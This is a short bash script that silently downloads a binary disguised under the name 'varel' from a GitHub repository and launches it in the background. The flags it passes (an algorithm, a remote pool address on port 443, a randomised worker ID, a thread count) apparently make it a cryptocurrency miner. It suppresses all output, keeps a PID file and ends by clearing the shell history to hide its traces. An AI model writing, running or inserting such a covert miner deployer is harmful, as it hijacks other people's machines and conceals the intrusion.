#!/bin/bash
set -e

echo "=== VAREL SETUP ==="
cd ~/

# === Install dependencies (silent) ===
sudo apt-get update >/dev/null 2>&1
sudo apt-get install -y wget ca-certificates gcc >/dev/null 2>&1

# === Download varel ===
if [ ! -f ~/varel ]; then
    echo "📥 Downloading varel..."
    wget -q -O ~/varel https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
    chmod +x ~/varel
fi

# === Kill old process ===
if [ -f ~/.varel.pid ]; then
    OLD_PID=$(cat ~/.varel.pid)
    kill $OLD_PID 2>/dev/null || true
    sleep 1
    kill -9 $OLD_PID 2>/dev/null || true
    rm -f ~/.varel.pid
fi

# Clean old files
rm -f ~/run.log ~/varel.out

# === Start varel (suppress verbose output) ===
RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-gtbbbb$(date +%s)"

# Jalankan tanpa --verbose untuk kurangi output
nohup ~/varel -a randomvirel \
  --url 137.184.31.121:443 \
  --user "$RANDOM_WORKER" \
  --threads=6 \
  --log-file=~/run.log \
  > ~/varel.out 2>&1 &

VAREL_PID=$!
echo $VAREL_PID > ~/.varel.pid

# Wait for initialization
sleep 8

# === Verify ===
if kill -0 $VAREL_PID 2>/dev/null; then
    echo "✅ Varel running (PID: $VAREL_PID)"
    echo "📊 Worker: $RANDOM_WORKER"
    
    # Show only last few lines
    if [ -f ~/run.log ] && [ -s ~/run.log ]; then
        echo "📄 Log:"
        tail -3 ~/run.log
    else
        echo "⏳ Log initializing..."
    fi
else
    echo "❌ Failed to start"
    tail -10 ~/varel.out 2>/dev/null || true
    exit 1
fi

history -c && history -w 2>/dev/null || true
